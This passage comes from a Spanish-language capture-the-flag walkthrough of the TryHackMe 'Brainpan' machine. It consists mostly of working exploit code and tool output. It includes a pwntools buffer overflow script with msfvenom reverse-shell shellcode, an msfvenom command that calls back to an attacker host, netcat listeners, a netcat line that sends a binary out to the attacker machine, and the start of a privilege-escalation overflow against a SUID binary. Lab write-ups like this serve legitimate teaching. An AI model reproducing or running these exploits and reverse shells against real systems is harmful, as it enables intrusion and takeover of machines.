shellcode += b"\x73\xe0\xd9\x5f\x8e\x63\xec\x97\xd0\x24\x98"
shellcode += b"\xa5\xd0\xcb\xe3\x23\x36\xa1\x03\x62\xe1\x5e"
shellcode += b"\xbd\x2f\x79\xfe\x42\xfa\x04\xc0\xc9\x09\xf9"
shellcode += b"\x8f\x39\x67\xe9\x78\xca\x32\x53\x2e\xd5\xe8"
shellcode += b"\xfb\xac\x44\x77\xfb\xbb\x74\x20\xac\xec\x4b"
shellcode += b"\x39\x38\x01\xf5\x93\x5e\xd8\x63\xdb\xda\x07"
shellcode += b"\x50\xe2\xe3\xca\xec\xc0\xf3\x12\xec\x4c\xa7"
shellcode += b"\xca\xbb\x1a\x11\xad\x15\xed\xcb\x67\xc9\xa7"
shellcode += b"\x9b\xfe\x21\x78\xdd\xfe\x6f\x0e\x01\x4e\xc6"
shellcode += b"\x57\x3e\x7f\x8e\x5f\x47\x9d\x2e\x9f\x92\x25"
shellcode += b"\x4e\x42\x36\x50\xe7\xdb\xd3\xd9\x6a\xdc\x0e"
shellcode += b"\x1d\x93\x5f\xba\xde\x60\x7f\xcf\xdb\x2d\xc7"
shellcode += b"\x3c\x96\x3e\xa2\x42\x05\x3e\xe7\x42\xa9\xc0"
shellcode += b"\x08"</span>
</code></pre></div></div><br>

<p class="plain-text">Simplemente cambiamos el <code class="language-plaintext highlighter-rouge">shellcode</code> y la dirección de el apartado de <code class="language-plaintext highlighter-rouge">remote</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32

offset </span><span class="o">= </span><span class="p">524
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A"</span><span class="o"> * </span><span class="p">offset

jmpesp </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x311712f3</span><span class="p">)</span><span class="p">

shellcode </span><span class="o">= </span><span class="no"> b</span><span class="s">"</span><span class="mi"></span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xfc\xbb\x8c\x20\xca\x92\xeb\x0c\x5e\x56\x31</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xff\xff\xff\x70\xc8\x48\x92\x88\x09\x2d\x1a</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x6d\x38\x6d\x78\xe6\x6b\x5d\x0a\xaa\x87\x16</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x5e\x5e\x13\x5a\x77\x51\x94\xd1\xa1\x5c\x25</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x49\x91\xff\xa5\x90\xc6\xdf\x94\x5a\x1b\x1e</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xd0\x87\xd6\x72\x89\xcc\x45\x62\xbe\x99\x55</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x09\x8c\x0c\xde\xee\x45\x2e\xcf\xa1\xde\x69</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xcf\x40\x32\x02\x46\x5a\x57\x2f\x10\xd1\xa3</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xdb\xa3\x33\xfa\x24\x0f\x7a\x32\xd7\x51\xbb</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xf5\x08\x24\xb5\x05\xb4\x3f\x02\x77\x62\xb5</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x90\xdf\xe1\x6d\x7c\xe1\x26\xeb\xf7\xed\x83</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x7f\x5f\xf2\x12\x53\xd4\x0e\x9e\x52\x3a\x87</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xe4\x70\x9e\xc3\xbf\x19\x87\xa9\x6e\x25\xd7</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x11\xce\x83\x9c\xbc\x1b\xbe\xff\xa8\xe8\xf3</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xff\x28\x67\x83\x8c\x1a\x28\x3f\x1a\x17\xa1</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x99\xdd\x58\x98\x5e\x71\xa7\x23\x9f\x58\x6c</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x77\xcf\xf2\x45\xf8\x84\x02\x69\x2d\x0a\x52</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xc5\x9e\xeb\x02\xa5\x4e\x84\x48\x2a\xb0\xb4</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x73\xe0\xd9\x5f\x8e\x63\xec\x97\xd0\x24\x98</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xa5\xd0\xcb\xe3\x23\x36\xa1\x03\x62\xe1\x5e</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xbd\x2f\x79\xfe\x42\xfa\x04\xc0\xc9\x09\xf9</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x8f\x39\x67\xe9\x78\xca\x32\x53\x2e\xd5\xe8</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xfb\xac\x44\x77\xfb\xbb\x74\x20\xac\xec\x4b</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x39\x38\x01\xf5\x93\x5e\xd8\x63\xdb\xda\x07</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x50\xe2\xe3\xca\xec\xc0\xf3\x12\xec\x4c\xa7</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xca\xbb\x1a\x11\xad\x15\xed\xcb\x67\xc9\xa7</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x9b\xfe\x21\x78\xdd\xfe\x6f\x0e\x01\x4e\xc6</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x57\x3e\x7f\x8e\x5f\x47\x9d\x2e\x9f\x92\x25</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x4e\x42\x36\x50\xe7\xdb\xd3\xd9\x6a\xdc\x0e</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x1d\x93\x5f\xba\xde\x60\x7f\xcf\xdb\x2d\xc7</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x3c\x96\x3e\xa2\x42\x05\x3e\xe7\x42\xa9\xc0</span><span class="s">"</span><span class="p">  
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x08</span><span class="s">"</span><span class="p">  

payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">jmpesp </span><span class="o">+ </span><span class="p">shellcode

shell </span><span class="o">=</span><span class="p"> remote(</span><span class="s">"10.10.27.47"</span><span class="p">, </span><span class="mi">9999</span><span class="p">)

shell.sendline(payload)
shell.close()</span>
</code></pre></div></div><br>

<p class="plain-text">Corremos el exploit y recibimos una <code class="language-plaintext highlighter-rouge">shell</code> de la máquina victima en la unidad <code class="language-plaintext highlighter-rouge">Z:</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3 </span><span class="p">exploit.py
[</span><span class="ve">+</span><span class="p">] Opening connection to 10.10.27.47 on port 9999: Done  
[</span><span class="az">*</span><span class="p">] Closed connection to 10.10.27.47 port 9999</span>
</code></pre></div></div><br>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ sudo netcat</span><span class="p"> -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.27.47  
CMD Version 1.4.1

Z:\home\puck></span><span class="am">whoami</span><span class="p">
File not found.

Z:\home\puck></span>
</code></pre></div></div><br>

<p class="plain-text">No podemos hacer un simple <code class="language-plaintext highlighter-rouge">whoami</code>, sin embargo al mirar los directorios en la <code class="language-plaintext highlighter-rouge">raiz</code> podemos ver que la estructura de directorios es de un <code class="language-plaintext highlighter-rouge">Linux</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">Z:\home\puck></span><span class="am">dir</span><span class="p"> Z:\
Volume in drive Z has no label.
Volume Serial Number is 0000-0000

Directory of Z:

  3/4/2013   1:02 PM  &ltDIR>         bin
  3/4/2013  11:19 AM  &ltDIR>         boot
  4/7/2023  11:09 PM  &ltDIR>         etc
  3/4/2013  11:49 AM  &ltDIR>         home
  3/4/2013  11:18 AM    15,084,717  initrd.img
  3/4/2013  11:18 AM    15,084,717  initrd.img.old
  3/4/2013   1:04 PM  &ltDIR>         lib
  3/4/2013  10:12 AM  &ltDIR>         lost+found
  3/4/2013  10:12 AM  &ltDIR>         media
 10/9/2012   9:59 AM  &ltDIR>         mnt
  3/4/2013  10:13 AM  &ltDIR>         opt
  3/7/2013  11:07 PM  &ltDIR>         root
  4/7/2023  11:09 PM  &ltDIR>         run
  3/4/2013  11:20 AM  &ltDIR>         sbin
 6/11/2012   9:43 AM  &ltDIR>         selinux
  3/4/2013  10:13 AM  &ltDIR>         srv
  4/8/2023  12:29 AM  &ltDIR>         tmp
  3/4/2013  10:13 AM  &ltDIR>         usr
  8/5/2019   3:47 PM  &ltDIR>         var
 2/25/2013   2:32 PM     5,180,432  vmlinuz
 2/25/2013   2:32 PM     5,180,432  vmlinuz.old
       4 files               40,530,298 bytes
      17 directories     13,849,333,760 bytes free  

Z:\home\puck></span>
</code></pre></div></div><br>

<p class="plain-text">Basta con ejecutar la ruta absoluta del binario <code class="language-plaintext highlighter-rouge">sh</code> para obtener una shell de <code class="language-plaintext highlighter-rouge">Linux</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">Z:\home\puck></span><span class="am">/bin/sh</span><span class="p">
sh: turning off NDELAY mode

script /dev/null -c bash
</span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ id
uid=1002(puck) gid=1002(puck) groups=1002(puck)  
</span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ hostname -I
10.10.27.47 
</span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Otra forma es cambiando el payload <code class="language-plaintext highlighter-rouge">msfvenom</code> a uno de linux x86 para recibir una sh</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ msfvenom</span><span class="p"> -p linux/x86/shell_reverse_tcp LHOST=10.8.64.87 LPORT=443 EXITFUNC=thread EXITFUNC=thread -b </span><span class="am">'\x00'</span><span class="p"> -f python -v shellcode -e x86/jmp_call_additive  
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/jmp_call_additive
x86/jmp_call_additive succeeded with size 97 (iteration=0)
x86/jmp_call_additive chosen with final size 97
Payload size: 97 bytes
Final size of python file: 558 bytes
shellcode =  b""
shellcode += b"\xfc\xbb\x0d\x3f\x97\x67\xeb\x0c\x5e\x56\x31"
shellcode += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
shellcode += b"\xff\xff\xff\x3c\xe4\x60\x84\x6d\x59\xdc\x21"
shellcode += b"\x93\xd4\x03\x05\xf5\x2b\x43\xf5\xa0\x03\x7b"
shellcode += b"\x37\xd2\x2d\xfd\x3e\xba\xa7\xf5\x80\x6d\xd0"
shellcode += b"\x07\x01\x90\x9b\x81\xe0\x22\xbd\xc1\xb3\x11"
shellcode += b"\xf1\xe1\xba\x74\x38\x65\xee\x1e\xad\x49\x7c"
shellcode += b"\xb6\x59\xb9\xad\x24\xf3\x4c\x52\xfa\x50\xc6"  
shellcode += b"\x74\x4a\x5d\x15\xf6\xaa\x62\xa5\xf7"</span>
</code></pre></div></div><br>

<p class="plain-text">Modificamos el script, lo ejecutamos y recibimos directamente una sh de Linux</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32

offset </span><span class="o">= </span><span class="p">524
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A"</span><span class="o"> * </span><span class="p">offset

jmpesp </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x311712f3</span><span class="p">)</span><span class="p">

shellcode </span><span class="o">= </span><span class="no"> b</span><span class="s">"</span><span class="mi"></span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xfc\xbb\x0d\x3f\x97\x67\xeb\x0c\x5e\x56\x31</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xff\xff\xff\x3c\xe4\x60\x84\x6d\x59\xdc\x21</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x93\xd4\x03\x05\xf5\x2b\x43\xf5\xa0\x03\x7b</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x37\xd2\x2d\xfd\x3e\xba\xa7\xf5\x80\x6d\xd0</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x07\x01\x90\x9b\x81\xe0\x22\xbd\xc1\xb3\x11</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xf1\xe1\xba\x74\x38\x65\xee\x1e\xad\x49\x7c</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xb6\x59\xb9\xad\x24\xf3\x4c\x52\xfa\x50\xc6</span><span class="s">"</span><span class="p">  
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x74\x4a\x5d\x15\xf6\xaa\x62\xa5\xf7</span><span class="s">"</span><span class="p">

payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">jmpesp </span><span class="o">+ </span><span class="p">shellcode

shell </span><span class="o">=</span><span class="p"> remote(</span><span class="s">"10.10.27.47"</span><span class="p">, </span><span class="mi">9999</span><span class="p">)

shell.sendline(payload)
shell.close()</span>
</code></pre></div></div><br>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3 </span><span class="p">exploit.py
[</span><span class="ve">+</span><span class="p">] Opening connection to 10.10.27.47 on port 9999: Done  
[</span><span class="az">*</span><span class="p">] Closed connection to 10.10.27.47 port 9999</span>
</code></pre></div></div><br>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ sudo netcat</span><span class="p"> -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.27.47  
script /dev/null -c bash
</span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ id
uid=1002(puck) gid=1002(puck) groups=1002(puck)  
</span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ hostname -I
10.10.27.47
</span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>
</section>

<section class="post" id="shell-anansi">
<br><h3 class="post-title">Shell - anansi</h3><br>

<p class="plain-text">Buscando archivos <code class="language-plaintext highlighter-rouge">suid</code> hay uno que sobresale, un binario personalizado <code class="language-plaintext highlighter-rouge">validate</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ find / -perm -u+s 2>/dev/null  
/bin/umount
/bin/su
/bin/mount
/bin/fusermount
/bin/ping6
/bin/ping
/usr/bin/sudo
/usr/bin/mtr
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/sudoedit
/usr/bin/chfn
/usr/bin/traceroute6.iputils
/usr/bin/at
/usr/bin/lppasswd
/usr/bin/passwd
/usr/bin/gpasswd
/usr/sbin/uuidd
/usr/sbin/pppd
/usr/local/bin/validate
/usr/lib/dbus-1.0/dbus-daemon-launch-helper  
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/pt_chown
</span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">El binario pertenece al usuario <code class="language-plaintext highlighter-rouge">anansi</code> y tiene el privilegio <code class="language-plaintext highlighter-rouge">suid</code> en los permisos</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ ls -l /usr/local/bin/validate
-rwsr-xr-x 1 anansi anansi 8761 Mar  4  2013 </span><span class="err">/usr/local/bin/validate</span><span class="p">  
</span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Al ejecutarlo nos pide un <code class="language-plaintext highlighter-rouge">input</code>, asi que le pasamos <code class="language-plaintext highlighter-rouge">test</code> como input aunque realmente no queda muy claro que es lo que hace con el, solo devuelve un <code class="language-plaintext highlighter-rouge">mensaje</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ validate
usage validate &ltinput>
</span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ validate test  
validating input...passed.
</span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Podemos descargar el <code class="language-plaintext highlighter-rouge">binario</code> en nuestra máquina para analizarlo usando <code class="language-plaintext highlighter-rouge">netcat</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$ netcat 10.8.64.87 4444 < /usr/local/bin/validate  
</span><span class="ve">puck@brainpan</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ netcat</span><span class="p"> -lvnp 4444 > validate  
Listening on 0.0.0.0 4444
Connection received on 10.10.27.47  </span>
</code></pre></div></div><br>

<p class="plain-text">Lo abrimos con <code class="language-plaintext highlighter-rouge">ida</code> y podemos ver la función <code class="language-plaintext highlighter-rouge">main</code> y todo su codigo base en <code class="language-plaintext highlighter-rouge">c</code></p>
<a href="/tryhackme/brainpan/15.png" target="_blank"><div><p><img src="/tryhackme/brainpan/15.png"></p></div></a>

<p class="plain-text">La función valida que este recibiendo un argumento y lo realmente destacable que hace es llamar a la función <code class="language-plaintext highlighter-rouge">validate</code> pasandole el primer <code class="language-plaintext highlighter-rouge">argumento</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">int </span><span class="p">__cdecl </span><span class="na">main</span><span class="p">(</span><span class="no">int </span><span class="am">argc</span><span class="p">, </span><span class="o">const </span><span class="no">char </span><span class="o">**</span><span class="na">argv</span><span class="p">, </span><span class="o">const </span><span class="no">char </span><span class="o">**</span><span class="am">envp</span><span class="p">)  
{
  </span><span class="o">if</span><span class="p"> ( argc </span><span class="o">> </span><span class="mi">1</span><span class="p"> )
  {
    </span><span class="no">printf</span><span class="p">(</span><span class="s">"validating input..."</span><span class="p">);
    </span><span class="o">if </span><span class="p">( validate((</span><span class="no">char </span><span class="o">*</span><span class="p">)argv[</span><span class="mi">1</span><span class="p">]) )
      </span><span class="no">puts</span><span class="p">(</span><span class="s">"passed."</span><span class="p">);
    </span><span class="o">return </span><span class="mi">0</span><span class="p">;
  }
  </span><span class="o">else</span><span class="p">
  {
    </span><span class="no">printf</span><span class="p">(</span><span class="s">"usage </span><span class="mi">%s</span><span class="s"> &ltinput></span><span class="mi">\n</span><span class="s">"</span><span class="p">, </span><span class="o">*</span><span class="p">argv);
    </span><span class="o">return </span><span class="mi">0</span><span class="p">;
  }
}</span>
</code></pre></div></div><br>

<p class="plain-text">En el codigo de la función <code class="language-plaintext highlighter-rouge">validate</code> tenemos <code class="language-plaintext highlighter-rouge">2</code> cosas bastante interesantes</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">char </span><span class="o">*</span><span class="p">__cdecl </span><span class="na">validate</span><span class="p">(</span><span class="no">char </span><span class="o">*</span><span class="am">string</span><span class="p">)
{
  </span><span class="no">char </span><span class="p">buffer[</span><span class="mi">100</span><span class="p">];</span><span class="c1"> // [esp+18h] [ebp-70h] BYREF
  </span><span class="no">int </span><span class="p">i; </span><span class="c1">// [esp+7Ch] [ebp-Ch]

  </span><span class="o">for </span><span class="p">( i </span><span class="o">= </span><span class="mi">0</span><span class="p">; i </span><span class="o">< </span><span class="p">(</span><span class="no">unsigned int</span><span class="p">)</span><span class="no">strlen</span><span class="p">(string); </span><span class="o">++</span><span class="p">i )  
  {
    </span><span class="o">if</span><span class="p"> ( string[i] </span><span class="o">== </span><span class="s">'F'</span><span class="p"> )
    {
      </span><span class="no">printf</span><span class="p">(</span><span class="s">"failed: </span><span class="mi">%x\n</span><span class="s">"</span><span class="p">, string[i]);
      </span><span class="no">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);
    }
  }
  </span><span class="no">strcpy</span><span class="p">(buffer, string);
  </span><span class="o">return </span><span class="p">buffer;
}</span>
</code></pre></div></div><br>

<p class="plain-text">Primero podemos ver que define un total de <code class="language-plaintext highlighter-rouge">100</code> bytes de <code class="language-plaintext highlighter-rouge">buffer</code> y usa la función <code class="language-plaintext highlighter-rouge">strcpy</code> con el argumento por lo que puede que sea vulnerable a <code class="language-plaintext highlighter-rouge">Buffer Overflow</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">char </span><span class="p">buffer[</span><span class="mi">100</span><span class="p">];
</span><span class="no">strcpy</span><span class="p">(buffer, string);  </span>
</code></pre></div></div><br>

<p class="plain-text">Pero en caso de que el caracter <code class="language-plaintext highlighter-rouge">F</code> este en el input se cortará donde este el caracter y omitira el resto, hay que tener esto en cuenta por posibles problemas más adelante</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">if</span><span class="p"> ( string[i] </span><span class="o">==</span><span class="s"> 'F' </span><span class="p">)
{
  </span><span class="no">printf</span><span class="p">(</span><span class="s">"failed: </span><span class="mi">%x\n</span><span class="s">"</span><span class="p">, string[i]);  
  </span><span class="no">exit(</span><span class="mi">1</span><span class="p">);
}</span>
</code></pre></div></div><br>

<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">checksec</code> podemos ver que el binario no tiene ninguna <code class="language-plaintext highlighter-rouge">protección</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ checksec </span><span class="p">validate
[</span><span class="az">*</span><span class="p">] '/home/kali/validate'
    Arch:     i386-32-little
    RELRO:    </span><span class="am">Partial RELRO</span><span class="p">
    Stack:    </span><span class="ro">No canary found</span><span class="p">
    NX:       </span><span class="ro">NX disabled</span><span class="p">
    PIE:      </span><span class="ro">No PIE (0x8048000)</span><span class="p">  
    RWX:      </span><span class="ro">Has RWX segments</span>
</code></pre></div></div><br>

<p class="plain-text">Abrimos <code class="language-plaintext highlighter-rouge">gdb</code> y corremos el programa pasandole un patrón de caracteres como <code class="language-plaintext highlighter-rouge">argumento</code>, al pasar del buffer asignado este corrompe sobrescribiendo registros</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ gdb </span><span class="p">-q validate
Reading symbols from </span><span class="ve">validate</span><span class="p">...
</span><span class="ro">pwndbg> </span><span class="p">cyclic 150
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
</span><span class="ro">pwndbg> </span><span class="p">run aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
Starting program: </span><span class="ve">/home/kali/validate </span><span class="p">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma  
Using host libthread_db library "</span><span class="ve">/lib/x86_64-linux-gnu/libthread_db.so.1</span><span class="p">".

Program received signal SIGSEGV, Segmentation fault.
</span><span class="az">0x62616165 </span><span class="p">in </span><span class="am">?? </span><span class="p">()
</span><span class="ro">pwndbg></span>
</code></pre></div></div><br>

<p class="plain-text">Si le pasamos a <code class="language-plaintext highlighter-rouge">cyclic</code> la direccion del EIP este nos mostrara el offset necesitado</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">pwndbg> </span><span class="p">cyclic -l $eip
</span><span class="sa">Finding cyclic pattern of 4 bytes: b'eaab' (hex: 0x65616162)  
</span><span class="ve">Found at offset 116
</span><span class="ro">pwndbg></span>
</code></pre></div></div><br>

<p class="plain-text">Si miramos con <code class="language-plaintext highlighter-rouge">ropper</code> direcciones a donde podemos saltar encontramos 2 instrucciones que nos ejecutan <code class="language-plaintext highlighter-rouge">call eax</code>, con lo que volveriamos al inicio del <code class="language-plaintext highlighter-rouge">input</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ ropper </span><span class="p">--file validate --jmp eax  

JMP Instructions
================

</span><span class="ro">0x080484af</span><span class="p">: </span><span class="am">call </span><span class="p">eax</span><span class="az">;
</span><span class="ro">0x0804862b</span><span class="p">: </span><span class="am">call </span><span class="p">eax</span><span class="az">;</span><span class="p">

2 gadgets found</span>
</code></pre></div></div><br>

<p class="plain-text">Cualquiera de las 2 direcciones para <code class="language-plaintext highlighter-rouge">CALL EAX</code> es válida en este caso usare la segunda pero hay que darle la vuelta ya que estamos en <code class="language-plaintext highlighter-rouge">little endian</code>, para ello crearemos una funcion llamada <code class="language-plaintext highlighter-rouge">p32</code> usando struct que se encargara de ello</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">p32 </span><span class="o">= lambda </span><span class="am">addr</span><span class="p">: struct.pack(</span><span class="s">"I"</span><span class="p">, addr)  </span>
</code></pre></div></div><br>

<p class="plain-text">Podemos empezar a crear un script definiendo el <code class="language-plaintext highlighter-rouge">offset</code> y la dirección de <code class="language-plaintext highlighter-rouge">CALL EAX</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python2
</span><span class="p">
offset </span><span class="o">= </span><span class="mi">116
</span><span class="p">
calleax </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x080484af</span><span class="p">)  </span>
</code></pre></div></div><br>

